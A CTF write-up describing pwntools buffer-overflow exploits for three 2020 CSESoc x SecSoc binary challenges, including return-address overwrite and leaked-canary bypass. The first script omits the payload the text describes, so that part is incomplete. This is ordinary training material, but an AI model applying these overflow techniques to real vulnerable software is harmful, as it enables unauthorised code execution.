# CSESoc x SecSoc CTF 2020

Despite entering as a team of 4, the CTF was just completed by myself and my good friend [featherbear](!https://featherbear.cc/)! We managed to claim first place, being ahead of second place by 20 points.

## Binary
These challenges were done by examining the disassembly using Binary Ninja.

### Simple
_Key observations:_
* `gets` is used - possible overflow vulnerability
* to take the winning branch, the value at [ebp-0xc] must equal 0x37333331
* buffer starts being written at [ebp-0x20]

_Overview:_
* pad the payload to allow 0x37333331 to be written at [ebp-0xc]

_Code:_
``` python
from pwn import *

p = remote('pwn.ctf.unswsecurity.com', 7004)

p.interactive()
```

### Exit 1337
_Key observations:_
* 1337%256 = 57 -> `exit` must be given 57 as its argument
* `gets` is used in `vuln` - possible overflow vulnerability
* buffer starts being written at [ebp-0x26]

_Overview:_
* pad the payload to until the return address location at [ebp+4]
* overwrite the return address with the address of where `exit` is called
* append the required value afterwards to set is as the argument

_Code:_
```python
from pwn import *

p = remote('pwn.ctf.unswsecurity.com', 7006)

payload = b''
# pad until the return address
payload += b'A' * (0x26+0x4)
# overwrite return address with address when
#   exit is called
payload += p32(0x8049219)
# set the required argument value
payload += p32(57)

p.sendline(payload)

p.interactive()
```

### Slightly Simple
_Key observations:_
* `gets` is used in `lol` - possible overflow vulnerability
* buffer starts being written at [ebp-0x20]
* canary check occurs with a value at [ebp-0xc]
* canary value is printed out
* `win` function is provided

_Overview:_
* obtain the given canary value
* pad the payload to until the canary location at [ebp-0xc]
* rewrite the canary
* pad the rest of the payload
* overwrite the return address with the win function

_Code:_
```python
from pwn import *

p = remote('pwn.ctf.unswsecurity.com', 7005)

# obtain the canary value
p.recvuntil('hi\n')
canary = p.recvuntil('\n', drop=True)
canary = b'0x' + canary
canary = int(canary, 16)

payload = b''
# pad until the canary
payload += b'A' * (0x20-0xC)
# overwrite the canary
payload += p32(canary)
# pad till the return address
payload += b'A' * 0xC
# overwrite return address
payload += p32(0x80491c6)

p.sendline(payload)

p.interactive()
```